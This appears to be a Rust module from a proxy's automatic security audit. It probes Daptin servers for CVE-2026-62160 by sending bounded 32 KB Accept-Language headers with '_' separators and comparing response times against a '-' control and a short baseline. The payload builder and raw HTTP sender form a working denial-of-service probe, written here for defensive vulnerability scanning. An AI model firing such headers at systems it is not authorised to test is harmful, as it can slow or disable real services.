//! CVE-2026-62160 / GHSA-rhj7-vh3v-mcq6: Daptin passes the raw `Accept-Language` header to
//! `golang.org/x/text` `ParseAcceptLanguage`. The CVE-2022-32149 guard counts `-` but not `_`, so
//! `_`-separated malformed tags drive quadratic parsing.
//!
//! The audit uses a bounded 32 KB header (the advisory used 256 KiB to 1 MiB) and compares the
//! `_` form against a `-` control that should hit the guard. HTTP is required because the probe
//! needs an exact, validation-free header; Daptin's default listener is HTTP.
use super::auto_audit::{self as audit, AuditState};
use proxy_core::{Intercept, TrafficEntry};
use serde_json::{json, Value};
use tokio::time::{sleep, Duration, Instant};

const ADVISORY: &str = "CVE-2026-62160 (GHSA-rhj7-vh3v-mcq6; Daptin Accept-Language separator bypass)";
const TOKEN: &str = "abcdefghi";
const HEADER_BYTES: usize = 32_000;
const MAX_SENDS: usize = 4;

fn header(headers: &serde_json::Map<String, Value>, name: &str) -> Option<String> {
    headers
        .iter()
        .find(|(key, _)| key.eq_ignore_ascii_case(name))
        .and_then(|(_, value)| value.as_str())
        .map(str::to_string)
}

/// Daptin marker in the captured response. The advisory's landing page and API identify the product.
pub(super) fn eligible(entry: &TrafficEntry) -> bool {
    if entry.method != "GET" || !entry.url.starts_with("http://") || !(200..400).contains(&entry.status_code)
    {
        return false;
    }
    let headers = audit::headers(&entry.response_headers);
    if ["server", "x-powered-by"]
        .iter()
        .any(|name| header(&headers, name).is_some_and(|value| value.to_ascii_lowercase().contains("daptin")))
    {
        return true;
    }
    let body = String::from_utf8_lossy(&entry.response_body);
    body.len() <= 512_000 && body.to_ascii_lowercase().contains("daptin")
}

pub(super) fn key(request: &Value) -> String {
    let origin = reqwest::Url::parse(request["url"].as_str().unwrap_or_default())
        .ok()
        .map(|url| url.origin().ascii_serialization())
        .unwrap_or_else(|| request["url"].as_str().unwrap_or_default().to_string());
    let digest = ring::digest::digest(&ring::digest::SHA256, origin.as_bytes());
    let hex: String = digest.as_ref().iter().map(|byte| format!("{byte:02x}")).collect();
    format!("auto-daptin-language-{hex}")
}

fn language_header(separator: char) -> String {
    let mut value = String::with_capacity(HEADER_BYTES + 16);
    value.push_str("en");
    while value.len() + 1 + TOKEN.len() <= HEADER_BYTES {
        value.push(separator);
        value.push_str(TOKEN);
    }
    value
}

fn verdict(baseline_ms: u64, control_ms: u64, attack_ms: u64, repeat_ms: u64) -> bool {
    let slow = attack_ms.min(repeat_ms);
    slow >= baseline_ms.saturating_add(150)
        && slow >= control_ms.saturating_add(150)
        && slow >= control_ms.saturating_mul(2)
}

async fn raw_get(request: &Value, header_value: &str) -> Option<Value> {
    let url = reqwest::Url::parse(request["url"].as_str()?).ok()?;
    if url.scheme() != "http" {
        return None;
    }
    let host = url.host_str()?.to_string();
    let port = url.port_or_known_default()?;
    let target = format!(
        "{}{}",
        url.path(),
        url.query().map(|query| format!("?{query}")).unwrap_or_default()
    );
    if target.len() > 4096 || header_value.len() > 64_000 {
        return None;
    }
    let mut headers = String::new();
    if let Some(map) = request["headers"].as_object() {
        for (name, value) in map {
            if ["host", "accept-language", "connection", "content-length", "transfer-encoding", "accept-encoding"]
                .iter()
                .any(|blocked| name.eq_ignore_ascii_case(blocked))
            {
                continue;
            }
            if let Some(value) = value.as_str() {
                if !value.contains(['\r', '\n']) && value.len() <= 8192 {
                    headers.push_str(&format!("{name}: {value}\r\n"));
                }
            }
        }
    }
    let start = Instant::now();
    let mut stream = tokio::time::timeout(
        Duration::from_secs(5),
        tokio::net::TcpStream::connect((host.as_str(), port)),
    )
    .await
    .ok()?
    .ok()?;
    let wire = format!(
        "GET {target} HTTP/1.1\r\nHost: {host}:{port}\r\nConnection: close\r\nAccept-Encoding: identity\r\nAccept-Language: {header_value}\r\n{headers}\r\n"
    );
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    tokio::time::timeout(Duration::from_secs(5), stream.write_all(wire.as_bytes()))
        .await
        .ok()?
        .ok()?;
    let mut bytes = Vec::new();
    let deadline = Instant::now() + Duration::from_secs(20);
    loop {
        let remaining = deadline.saturating_duration_since(Instant::now());
        if remaining.is_zero() {
            break;
        }
        let mut chunk = [0u8; 8192];
        match tokio::time::timeout(remaining, stream.read(&mut chunk)).await {
            Ok(Ok(0)) => break,
            Ok(Ok(count)) => {
                bytes.extend_from_slice(&chunk[..count]);
                if bytes.len() > 2_000_000 {
                    break;
                }
            }
            _ => break,
        }
    }
    let end = bytes.windows(4).position(|window| window == b"\r\n\r\n")?;
    let head = std::str::from_utf8(&bytes[..end]).ok()?;
    let mut lines = head.split("\r\n");
    let status = lines.next()?.split_whitespace().nth(1)?.parse::<u16>().ok()?;
    let mut response_headers = serde_json::Map::new();
    for line in lines {
        if let Some((name, value)) = line.split_once(':') {
            response_headers.insert(name.trim().to_ascii_lowercase(), json!(value.trim()));
        }
    }
    let body = bytes[end + 4..].to_vec();
    Some(json!({
        "ok": true,
        "status": status,
        "responseHeaders": response_headers,
        "responseBody": String::from_utf8_lossy(&body),
        "duration": start.elapsed().as_millis() as u64,
        "size": body.len(),
    }))
}

fn evidence_item(id: &str, label: &str, request: &Value, result: &Value, language_len: usize) -> Value {
    let mut item = json!({
        "id": id,
        "label": label,
        "timestamp": chrono::Utc::now().to_rfc3339(),
        "request": request,
        "setCookies": [],
        "duration": result["duration"].as_u64().unwrap_or(0).min(3_600_000),
        "size": result["size"].as_u64().unwrap_or(0).min(2_000_000),
        "truncated": false,
    });
    if result["ok"] == true {
        let body = result["responseBody"].as_str().unwrap_or_default();
        let mut headers = result["responseHeaders"].as_object().cloned().unwrap_or_default();
        let count = headers.len();
        headers.retain(|_, value| value.as_str().is_some_and(|text| text.len() <= 8192));
        let headers: serde_json::Map<_, _> = headers.into_iter().take(200).collect();
        item["truncated"] = json!(body.chars().count() > 32000 || headers.len() != count);
        item["response"] = json!({
            "status": result["status"],
            "responseHeaders": headers,
            "responseBody": audit::preview(body, 32000),
        });
    } else {
        item["error"] = json!(audit::preview(
            result["error"].as_str().unwrap_or("Request failed"),
            4000
        ));
    }
    item["request"]["headers"]["Accept-Language"] = json!(format!("[redacted, {language_len} bytes]"));
    item
}

pub(super) async fn audit(
    entry: &TrafficEntry,
    id: &str,
    state: &AuditState,
    intercept: &Intercept,
) -> Option<Value> {
    if !state.enabled() || !intercept.scope().matches(&entry.host) {
        return None;
    }
    let original = audit::request(entry)?;
    let mut evidence = vec![audit::observed(entry, &original)];
    let mut sent = 0;
    let baseline = raw_get(&original, "en-US").await?;
    sent += 1;
    evidence.push(evidence_item("daptin-baseline", "Short Accept-Language", &original, &baseline, 5));
    if baseline["ok"] != true || !(200..300).contains(&baseline["status"].as_u64().unwrap_or(0)) {
        return None;
    }
    let baseline_ms = baseline["duration"].as_u64().unwrap_or(0);
    sleep(Duration::from_millis(500)).await;
    let control_header = language_header('-');
    let control = raw_get(&original, &control_header).await?;
    sent += 1;
    evidence.push(evidence_item("daptin-control", "32 KB '-' control (CVE-2022-32149 guard)", &original, &control, control_header.len()));
    sleep(Duration::from_millis(500)).await;
    let attack_header = language_header('_');
    let attack = raw_get(&original, &attack_header).await?;
    sent += 1;
    evidence.push(evidence_item("daptin-attack", "32 KB '_' separator", &original, &attack, attack_header.len()));
    sleep(Duration::from_millis(500)).await;
    let repeat = raw_get(&original, &attack_header).await?;
    sent += 1;
    evidence.push(evidence_item("daptin-attack-repeat", "32 KB '_' separator repeat", &original, &repeat, attack_header.len()));

    let control_ms = control["duration"].as_u64().unwrap_or(0);
    let attack_ms = attack["duration"].as_u64().unwrap_or(0);
    let repeat_ms = repeat["duration"].as_u64().unwrap_or(0);
    let findings = if control["ok"] == true
        && attack["ok"] == true
        && repeat["ok"] == true
        && verdict(baseline_ms, control_ms, attack_ms, repeat_ms)
    {
        vec![json!({
            "id": "daptin-language-timing",
            "fingerprint": "daptin-accept-language:underscore-quadratic",
            "checkId": "daptin-accept-language",
            "title": "Timing pattern consistent with CVE-2026-62160 (Daptin Accept-Language)",
            "summary": format!(
                "A 32 KB Accept-Language value using '_' separators took {attack_ms}/{repeat_ms} ms, while the short header took {baseline_ms} ms and the '-' control took {control_ms} ms. Daptin forwards the raw header to golang.org/x/text ParseAcceptLanguage; CVE-2022-32149's guard counts '-' but not '_', so malformed '_' tags drive quadratic parsing. The advisory measured 9–27 s with 256 KB; this probe is bounded to 32 KB and never reaches the 1 MB header ceiling. Timing requires lockfile/version confirmation."
            ),
            "severity": "high",
            "confidence": "medium",
            "status": "needs_review",
            "evidenceIds": ["observed", "daptin-baseline", "daptin-control", "daptin-attack", "daptin-attack-repeat"],
            "excerpts": [
                format!("Short header: {baseline_ms} ms"),
                format!("32 KB '-' control: {control_ms} ms"),
                format!("32 KB '_' attack: {attack_ms} ms and {repeat_ms} ms"),
            ],
            "remediation": "Upgrade Daptin to a build containing the Accept-Language separator cap (master commit 2d709509), or cap combined '-'/'_' separators in middleware before ParseAcceptLanguage.",
            "verification": {
                "method": "bounded Accept-Language timing differential against a Daptin fingerprint",
                "outcome": "inconclusive",
                "reason": "Timing is consistent with the advisory but does not prove the deployed version; confirm the Daptin build and dependency version."
            }
        })]
    } else {
        vec![]
    };
    let checks = vec![json!({
        "checkId": "daptin-accept-language",
        "status": if !findings.is_empty() { "findings" } else { "passed" },
        "message": if findings.is_empty() {
            "No super-linear Accept-Language parsing was observed for the 32 KB '_' probe."
        } else {
            "Bounded 32 KB timing differential is consistent with the Daptin advisory."
        },
        "findingIds": findings.iter().map(|finding| finding["id"].clone()).collect::<Vec<_>>()
    })];
    let mut run = audit::run(entry, id, &original, evidence, findings, checks, sent, "active");
    run["auditKey"] = json!(key(&original));
    run["profileName"] = json!("Automatic Daptin Accept-Language audit");
    run["plan"]["maxRequests"] = json!(MAX_SENDS);
    let _ = ADVISORY;
    Some(run)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn builds_bounded_language_headers() {
        let header = language_header('_');
        assert!(header.starts_with("en_abcdefghi"));
        assert!(header.len() <= HEADER_BYTES);
        assert!(!header.contains('-'));
        assert!(language_header('-').contains('-'));
    }

    #[test]
    fn verdict_requires_slow_attack_against_control() {
        assert!(verdict(20, 100, 900, 850));
        assert!(!verdict(20, 100, 150, 140));
        assert!(!verdict(20, 900, 1000, 980));
    }
}
